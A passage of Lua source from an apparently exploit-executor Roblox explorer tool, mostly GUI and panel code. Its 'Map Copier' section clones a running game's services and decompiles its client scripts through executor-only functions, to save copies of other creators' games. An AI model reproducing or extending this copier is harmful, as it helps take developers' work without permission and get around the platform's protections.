			v.MouseButton1Click:connect(function()
				switchWindows(v.Name)
			end)

			v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
			v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
		end


		function createSetting(name,interName,defaultOn)
			local newSetting = SettingTemplate:Clone()
			newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
			newSetting.SName.Text = name

			local function toggle(on)
				if on then
					newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Status.Text = "On"
					Settings[interName] = true
				else
					newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Status.Text = "Off"
					Settings[interName] = false
				end
			end	

			newSetting.Change.MouseButton1Click:connect(function()
				toggle(not Settings[interName])
			end)

			newSetting.Visible = true
			newSetting.Parent = SettingList

			if defaultOn then
				toggle(true)
			end
		end

		createSetting("Click part to select","ClickSelect",false)
		createSetting("Selection Box","SelBox",false)
		createSetting("Clear property value on focus","ClearProps",false)
		createSetting("Select ungrouped models","SelectUngrouped",true)
		createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

		local function getSelection()
			local t = GetSelection:Invoke()
			if t and #t > 0 then
				return t[1]
			else
				return nil
			end
		end

		Mouse.Button1Down:connect(function()
			if CurrentWindow == "Explorer" and Settings.ClickSelect then
				local target = Mouse.Target
				if target then
					SetSelection:Invoke({target})
				end
			end
		end)

		SelectionChanged.Event:connect(function()
			if Settings.SelBox then
				local success,err = pcall(function()
					local selection = getSelection()
					SelectionBox.Adornee = selection
				end)
				if err then
					SelectionBox.Adornee = nil
				end
			end
		end)

		SettingsListener.OnInvoke = ReturnSetting

		-- Map Copier

		function createMapSetting(obj,interName,defaultOn)
			local function toggle(on)
				if on then
					obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Status.Text = "On"
					SaveMapSettings[interName] = true
				else
					obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Status.Text = "Off"
					SaveMapSettings[interName] = false
				end
			end	

			obj.Change.MouseButton1Click:connect(function()
				toggle(not SaveMapSettings[interName])
			end)

			obj.Visible = true
			obj.Parent = SaveMapSettingFrame

			if defaultOn then
				toggle(true)
			end
		end

		function createCopyWhatSetting(serv)
			if SaveMapSettings.CopyWhat[serv] then
				local newSetting = SaveMapCopyTemplate:Clone()
				newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
				newSetting.Info.Text = serv

				local function toggle(on)
					if on then
						newSetting.Change.enabled.Visible = true
						SaveMapSettings.CopyWhat[serv] = true
					else
						newSetting.Change.enabled.Visible = false
						SaveMapSettings.CopyWhat[serv] = false
					end
				end	

				newSetting.Change.MouseButton1Click:connect(function()
					toggle(not SaveMapSettings.CopyWhat[serv])
				end)

				newSetting.Visible = true
				newSetting.Parent = SaveMapCopyList
			end
		end

		createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
		createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
		createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
		createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

		createCopyWhatSetting("Workspace")
		createCopyWhatSetting("Lighting")
		createCopyWhatSetting("ReplicatedStorage")
		createCopyWhatSetting("ReplicatedFirst")
		createCopyWhatSetting("StarterPack")
		createCopyWhatSetting("StarterGui")
		createCopyWhatSetting("StarterPlayer")

		SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

		SaveMapButton.MouseButton1Click:connect(function()
			local copyWhat = {}

			local copyGroup = Instance.new("Model",game.ReplicatedStorage)

			local copyScripts = SaveMapSettings.SaveScripts

			local copyTerrain = SaveMapSettings.SaveTerrain

			local lightingProperties = SaveMapSettings.LightingProperties

			local cameraInstances = SaveMapSettings.CameraInstances

			-----------------------------------------------------------------------------------

			for i,v in pairs(SaveMapSettings.CopyWhat) do
				if v then
					table.insert(copyWhat,i)
				end
			end

			local consoleFunc = printconsole or writeconsole

			if consoleFunc then
				consoleFunc("Raspberry Pi's place copier loaded.")
				consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
			end

			function archivable(root)
				for i,v in pairs(root:GetChildren()) do
					if not game.Players:GetPlayerFromCharacter(v) then
						v.Archivable = true
						archivable(v)
					end
				end
			end

			function decompileS(root)
				for i,v in pairs(root:GetChildren()) do
					pcall(function()
						if v:IsA("LocalScript") then
							local isDisabled = v.Disabled
							v.Disabled = true
							v.Source = decompile(v)
							v.Disabled = isDisabled

							if v.Source == "" then 
								if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
							else
								if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
							end
						elseif v:IsA("ModuleScript") then
							v.Source = decompile(v)

							if v.Source == "" then 
								if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
							else
								if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
							end
						end
					end)
					decompileS(v)
				end
			end

			for i,v in pairs(copyWhat) do archivable(game[v]) end

			for j,obj in pairs(copyWhat) do
				if obj ~= "StarterPlayer" then
					local newFolder = Instance.new("Folder",copyGroup)
					newFolder.Name = obj
					for i,v in pairs(game[obj]:GetChildren()) do
						if v ~= copyGroup then
							pcall(function()
								v:Clone().Parent = newFolder
							end)
						end
					end
				else
					local newFolder = Instance.new("Model",copyGroup)
					newFolder.Name = "StarterPlayer"
					for i,v in pairs(game[obj]:GetChildren()) do
						local newObj = Instance.new("Folder",newFolder)
						newObj.Name = v.Name
						for _,c in pairs(v:GetChildren()) do
							if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
								c:Clone().Parent = newObj
							end
						end
					end
				end
			end

			if workspace.CurrentCamera and cameraInstances then
				local cameraFolder = Instance.new("Model",copyGroup)
				cameraFolder.Name = "CameraItems"
				for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
			end

			if copyTerrain then
				local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
				myTerrain.Parent = copyGroup
			end

			function saveProp(obj,prop,par)
				local myProp = obj[prop]
				if type(myProp) == "boolean" then
					local newProp = Instance.new("BoolValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "number" then
					local newProp = Instance.new("IntValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "string" then
					local newProp = Instance.new("StringValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "userdata" then -- Assume Color3
					pcall(function()
						local newProp = Instance.new("Color3Value",par)
						newProp.Name = prop
						newProp.Value = myProp
					end)
				end
			end

			if lightingProperties then
				local lightingProps = Instance.new("Model",copyGroup)
				lightingProps.Name = "LightingProperties"

				saveProp(game.Lighting,"Ambient",lightingProps)
				saveProp(game.Lighting,"Brightness",lightingProps)
				saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
				saveProp(game.Lighting,"ColorShift_Top",lightingProps)
				saveProp(game.Lighting,"GlobalShadows",lightingProps)
				saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
				saveProp(game.Lighting,"Outlines",lightingProps)
				saveProp(game.Lighting,"GeographicLatitude",lightingProps)
				saveProp(game.Lighting,"TimeOfDay",lightingProps)
				saveProp(game.Lighting,"FogColor",lightingProps)
				saveProp(game.Lighting,"FogEnd",lightingProps)
				saveProp(game.Lighting,"FogStart",lightingProps)
			end

			if decompile and copyScripts then
				decompileS(copyGroup)
			end

			if SaveInstance then
				SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
			elseif saveinstance then
				saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
			end
			--print("Saved!")
			if consoleFunc then
				consoleFunc("The map has been copied.")
			end
			SaveMapButton.Text = "The map has been saved"
			wait(5)
			SaveMapButton.Text = "Save"
		end)

		-- End Copier

		wait()

		IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

		switchWindows("Explorer")

		wait(1)

		SideMenu.Visible = true

		for i = 0,1,0.1 do
			IntroFrame.BackgroundTransparency = i
			IntroFrame.Main.BackgroundTransparency = i
			IntroFrame.Slant.ImageTransparency = i
			IntroFrame.Title.TextTransparency = i
			IntroFrame.Version.TextTransparency = i
			IntroFrame.Creator.TextTransparency = i
			wait()
		end

		IntroFrame.Visible = false

		SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

		wait(0.5)

		for i = 1,0,-0.1 do
			OpenScriptEditorButton.Icon.ImageTransparency = i
			CloseToggleButton.TextTransparency = i
			wait()
		end

		CloseToggleButton.Active = true
		CloseToggleButton.AutoButtonColor = true

		OpenScriptEditorButton.Active = true
		OpenScriptEditorButton.AutoButtonColor = true
	end)
	spawn(function()
		-- initial states
		local Option = {
			-- can modify object parents in the hierarchy
			Modifiable = false;
			-- can select objects
			Selectable = true;
		}

		-- MERELY

		Option.Modifiable = true

		-- END MERELY

		-- general size of GUI objects, in pixels
		local GUI_SIZE = 16
		-- padding between items within each entry
		local ENTRY_PADDING = 1
		-- padding between each entry
		local ENTRY_MARGIN = 1

		local Input = game:GetService("UserInputService")
		local HoldingCtrl = false
		local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

		local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
		local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
		local HEADER_SIZE = ENTRY_SIZE*2

		local FONT = 'SourceSans'
		local FONT_SIZE do
			local size = {8,9,10,11,12,14,18,24,36,48}
			local s
			local n = math.huge
			for i = 1,#size do
				if size[i] <= GUI_SIZE then
					FONT_SIZE = i - 1
				end
			end
		end

		local GuiColor = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 96/255, 140/255, 211/255);
			BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Icon map constants

		local MAP_ID = 483448923

		-- Indices based on implementation of Icon function.
		local ACTION_CUT         	 = 160
		local ACTION_COPY        	 = 161
		local ACTION_PASTE       	 = 162
		local ACTION_DELETE      	 = 163
		local ACTION_SORT        	 = 164
		local ACTION_CUT_OVER    	 = 174
		local ACTION_COPY_OVER   	 = 175
		local ACTION_PASTE_OVER  	 = 176
		local ACTION_DELETE_OVER	 = 177
		local ACTION_SORT_OVER  	 = 178
		local ACTION_EDITQUICKACCESS = 190
		local ACTION_FREEZE 		 = 188
		local ACTION_STARRED 		 = 189
		local ACTION_ADDSTAR 		 = 184
		local ACTION_ADDSTAR_OVER 	 = 187

		local NODE_COLLAPSED      = 165
		local NODE_EXPANDED       = 166
		local NODE_COLLAPSED_OVER = 179
		local NODE_EXPANDED_OVER  = 180

		local ExplorerIndex = {
			["Accessory"] = 32;
			["Accoutrement"] = 32;
			["AdService"] = 73;
			["Animation"] = 60;
			["AnimationController"] = 60;
			["AnimationTrack"] = 60;
			["Animator"] = 60;
			["ArcHandles"] = 56;
			["AssetService"] = 72;
			["Attachment"] = 34;
			["Backpack"] = 20;
			["BadgeService"] = 75;
			["BallSocketConstraint"] = 89;
			["BillboardGui"] = 64;
			["BinaryStringValue"] = 4;
			["BindableEvent"] = 67;
			["BindableFunction"] = 66;
			["BlockMesh"] = 8;
			["BloomEffect"] = 90;
			["BlurEffect"] = 90;
			["BodyAngularVelocity"] = 14;
			["BodyForce"] = 14;
			["BodyGyro"] = 14;
			["BodyPosition"] = 14;
			["BodyThrust"] = 14;
			["BodyVelocity"] = 14;
			["BoolValue"] = 4;
			["BoxHandleAdornment"] = 54;
			["BrickColorValue"] = 4;
			["Camera"] = 5;
			["CFrameValue"] = 4;
			["CharacterMesh"] = 60;
			["Chat"] = 33;
			["ClickDetector"] = 41;
			["CollectionService"] = 30;
			["Color3Value"] = 4;
			["ColorCorrectionEffect"] = 90;
			["ConeHandleAdornment"] = 54;
			["Configuration"] = 58;
			["ContentProvider"] = 72;
			["ContextActionService"] = 41;
			["PlayerGui"] = 46;
			["CoreScript"] = 18;
			["CornerWedgePart"] = 1;
			["CustomEvent"] = 4;
			["CustomEventReceiver"] = 4;
			["CylinderHandleAdornment"] = 54;
			["CylinderMesh"] = 8;
			["CylindricalConstraint"] = 89;
			["Debris"] = 30;
			["Decal"] = 7;
			["Dialog"] = 62;
			["DialogChoice"] = 63;
			["DoubleConstrainedValue"] = 4;
			["Explosion"] = 36;
			["FileMesh"] = 8;
			["Fire"] = 61;
			["Flag"] = 38;
			["FlagStand"] = 39;
			["FloorWire"] = 4;
			["Folder"] = 70;
			["ForceField"] = 37;
			["Frame"] = 48;
			["GamePassService"] = 19;
			["Glue"] = 34;
			["GuiButton"] = 52;
			["GuiMain"] = 47;
			["GuiService"] = 47;
			["Handles"] = 53;
			["HapticService"] = 84;
			["Hat"] = 45;
			["HingeConstraint"] = 89;
			["Hint"] = 33;
			["HopperBin"] = 22;
			["HttpService"] = 76;
			["Humanoid"] = 9;
			["ImageButton"] = 52;
			["ImageLabel"] = 49;
			["InsertService"] = 72;
			["IntConstrainedValue"] = 4;
			["IntValue"] = 4;
			["JointInstance"] = 34;
			["JointsService"] = 34;
			["Keyframe"] = 60;
			["KeyframeSequence"] = 60;
			["KeyframeSequenceProvider"] = 60;
			["Lighting"] = 13;
			["LineHandleAdornment"] = 54;
			["LocalScript"] = 18;
			["LogService"] = 87;
			["MarketplaceService"] = 46;
			["Message"] = 33;
			["Model"] = 2;
			["ModuleScript"] = 71;
			["Motor"] = 34;
			["Motor6D"] = 34;
			["MoveToConstraint"] = 89;
			["NegateOperation"] = 78;
			["NetworkClient"] = 16;
			["NetworkReplicator"] = 29;
			["NetworkServer"] = 15;
			["NumberValue"] = 4;
			["ObjectValue"] = 4;
			["Pants"] = 44;
			["ParallelRampPart"] = 1;
			["Part"] = 1;
			["ParticleEmitter"] = 69;
			["PartPairLasso"] = 57;
			["PathfindingService"] = 37;
			["Platform"] = 35;
			["Player"] = 12;
			["PlayerGui"] = 46;
			["Players"] = 21;
			["PlayerScripts"] = 82;
			["PointLight"] = 13;
			["PointsService"] = 83;
			["Pose"] = 60;
			["PrismaticConstraint"] = 89;
			["PrismPart"] = 1;
			["PyramidPart"] = 1;
			["RayValue"] = 4;
			["ReflectionMetadata"] = 86;
			["ReflectionMetadataCallbacks"] = 86;
			["ReflectionMetadataClass"] = 86;
			["ReflectionMetadataClasses"] = 86;
			["ReflectionMetadataEnum"] = 86;
			["ReflectionMetadataEnumItem"] = 86;
			["ReflectionMetadataEnums"] = 86;
			["ReflectionMetadataEvents"] = 86;
			["ReflectionMetadataFunctions"] = 86;
			["ReflectionMetadataMember"] = 86;
			["ReflectionMetadataProperties"] = 86;
			["ReflectionMetadataYieldFunctions"] = 86;
			["RemoteEvent"] = 80;
			["RemoteFunction"] = 79;
			["ReplicatedFirst"] = 72;
			["ReplicatedStorage"] = 72;
			["RightAngleRampPart"] = 1;
			["RocketPropulsion"] = 14;
			["RodConstraint"] = 89;
			["RopeConstraint"] = 89;
			["Rotate"] = 34;
			["RotateP"] = 34;
			["RotateV"] = 34;
			["RunService"] = 66;
			["ScreenGui"] = 47;
			["Script"] = 6;
			["ScrollingFrame"] = 48;
			["Seat"] = 35;
			["Selection"] = 55;
			["SelectionBox"] = 54;
			["SelectionPartLasso"] = 57;
			["SelectionPointLasso"] = 57;
			["SelectionSphere"] = 54;
			["ServerScriptService"] = 0;
			["ServerStorage"] = 74;
			["Shirt"] = 43;
			["ShirtGraphic"] = 40;
			["SkateboardPlatform"] = 35;
			["Sky"] = 28;
			["SlidingBallConstraint"] = 89;
			["Smoke"] = 59;
			["Snap"] = 34;
			["Sound"] = 11;
			["SoundService"] = 31;
			["Sparkles"] = 42;
			["SpawnLocation"] = 25;
			["SpecialMesh"] = 8;
			["SphereHandleAdornment"] = 54;
			["SpotLight"] = 13;
			["SpringConstraint"] = 89;
			["StarterCharacterScripts"] = 82;
			["StarterGear"] = 20;
			["StarterGui"] = 46;
			["StarterPack"] = 20;
			["StarterPlayer"] = 88;
			["StarterPlayerScripts"] = 82;
			["Status"] = 2;
			["StringValue"] = 4;
			["SunRaysEffect"] = 90;
			["SurfaceGui"] = 64;
			["SurfaceLight"] = 13;
			["SurfaceSelection"] = 55;
			["Team"] = 24;
			["Teams"] = 23;
			["TeleportService"] = 81;
			["Terrain"] = 65;
			["TerrainRegion"] = 65;
			["TestService"] = 68;
			["TextBox"] = 51;
			["TextButton"] = 51;
			["TextLabel"] = 50;
			["Texture"] = 10;
			["TextureTrail"] = 4;
			["Tool"] = 17;
			["TouchTransmitter"] = 37;
			["TrussPart"] = 1;
			["UnionOperation"] = 77;
			["UserInputService"] = 84;
			["Vector3Value"] = 4;
			["VehicleSeat"] = 35;
			["VelocityMotor"] = 34;
			["WedgePart"] = 1;
			["Weld"] = 34;
			["Workspace"] = 19;
		}

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------

		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end

		local barActive = false
		local activeOptions = {}

		function createDDown(dBut, callback,...)
			if barActive then
				for i,v in pairs(activeOptions) do
					v:Destroy()
				end
				activeOptions = {}
				barActive = false
				return
			else
				barActive = true
			end
			local slots = {...}
			local base = dBut
			for i,v in pairs(slots) do
				local newOption = base:Clone()
				newOption.ZIndex = 5
				newOption.Name = "Option "..tostring(i)
				newOption.Parent = base.Parent.Parent.Parent
				newOption.BackgroundTransparency = 0
				newOption.ZIndex = 2
				table.insert(activeOptions,newOption)
				newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
				newOption.Text = slots[i]
				newOption.MouseButton1Down:connect(function()
					dBut.Text = slots[i]
					callback(slots[i])
					for i,v in pairs(activeOptions) do
						v:Destroy()
					end
					activeOptions = {}
					barActive = false
				end)
			end
		end

		-- Connects a function to an event such that it fires asynchronously
		function Connect(event,func)
			return event:connect(function(...)
				local a = {...}
				spawn(function() func(unpack(a)) end)
			end)
		end

		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end

		do
			local ZIndexLock = {}
			-- Sets the ZIndex of an object and its descendants. Objects are locked so
			-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
			-- ZIndex of the same object.
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end

			function SetZIndexOnChanged(object)
				return object.Changed:connect(function(p)
					if p == "ZIndex" then
						SetZIndex(object,object.ZIndex)
					end
				end)
			end
		end

		---- IconMap ----
		-- Image size: 256px x 256px
		-- Icon size: 16px x 16px
		-- Padding between each icon: 2px
		-- Padding around image edge: 1px
		-- Total icons: 14 x 14 (196)
		local Icon do
			local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
			game:GetService('ContentProvider'):Preload(iconMap)
			local iconDehash do
				-- 14 x 14, 0-based input, 0-based output
				local f=math.floor
				function iconDehash(h)
					return f(h/14%14),f(h%14)
				end
			end

			function Icon(IconFrame,index)
				local row,col = iconDehash(index)
				local mapSize = Vector2.new(256,256)
				local pad,border = 2,1
				local iconSize = 16

				local class = 'Frame'
				if type(IconFrame) == 'string' then
					class = IconFrame
					IconFrame = nil
				end

				if not IconFrame then
					IconFrame = Create(class,{
						Name = "Icon";
						BackgroundTransparency = 1;
						ClipsDescendants = true;
						Create('ImageLabel',{
							Name = "IconMap";
							Active = false;
							BackgroundTransparency = 1;
							Image = iconMap;
							Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
						});
					})
				end

				IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
				return IconFrame
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- ScrollBar
		do
			-- AutoButtonColor doesn't always reset properly
			local function ResetButtonColor(button)
				local active = button.Active
				button.Active = not active
				button.Active = active
			end

			local function ArrowGraphic(size,dir,scaled,template)
				local Frame = Create('Frame',{
					Name = "Arrow Graphic";
					BorderSizePixel = 0;
					Size = UDim2.new(0,size,0,size);
					Transparency = 1;
				})
				if not template then
					template = Instance.new("Frame")
					template.BorderSizePixel = 0
				end

				local transform
				if dir == nil or dir == 'Up' then
					function transform(p,s) return p,s end
				elseif dir == 'Down' then
					function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
				elseif dir == 'Left' then
					function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
				elseif dir == 'Right' then
					function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
				end

				local scale
				if scaled then
					function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
				else
					function scale(p,s) return p,s end
				end

				local o = math.floor(size/4)
				if size%2 == 0 then
					local n = size/2-1
					for i = 0,n do
						local t = template:Clone()
						local p,s = scale(transform(
							UDim2.new(0,n-i,0,o+i),
							UDim2.new(0,(i+1)*2,0,1)
							))
						t.Position = p
						t.Size = s
						t.Parent = Frame
					end
				else
					local n = (size-1)/2
					for i = 0,n do
						local t = template:Clone()
						local p,s = scale(transform(
							UDim2.new(0,n-i,0,o+i),
							UDim2.new(0,i*2+1,0,1)
							))
						t.Position = p
						t.Size = s
						t.Parent = Frame
					end
				end
				if size%4 > 1 then
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,0,0,size-o-1),
						UDim2.new(0,size,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
				return Frame
			end


			local function GripGraphic(size,dir,spacing,scaled,template)
				local Frame = Create('Frame',{
					Name = "Grip Graphic";
					BorderSizePixel = 0;
					Size = UDim2.new(0,size.x,0,size.y);
					Transparency = 1;
				})
				if not template then
					template = Instance.new("Frame")
					template.BorderSizePixel = 0
				end

				spacing = spacing or 2

				local scale
				if scaled then
					function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
				else
					function scale(p) return p end
				end

				if dir == 'Vertical' then
					for i=0,size.x-1,spacing do
						local t = template:Clone()
						t.Size = scale(UDim2.new(0,1,0,size.y))
						t.Position = scale(UDim2.new(0,i,0,0))
						t.Parent = Frame
					end
				elseif dir == nil or dir == 'Horizontal' then
					for i=0,size.y-1,spacing do
						local t = template:Clone()
						t.Size = scale(UDim2.new(0,size.x,0,1))
						t.Position = scale(UDim2.new(0,0,0,i))
						t.Parent = Frame
					end
				end

				return Frame
			end

			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
					Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
						Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
						BackgroundColor3 = GuiColor.Button;
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
						BackgroundColor3 = GuiColor.Button;
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
						Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
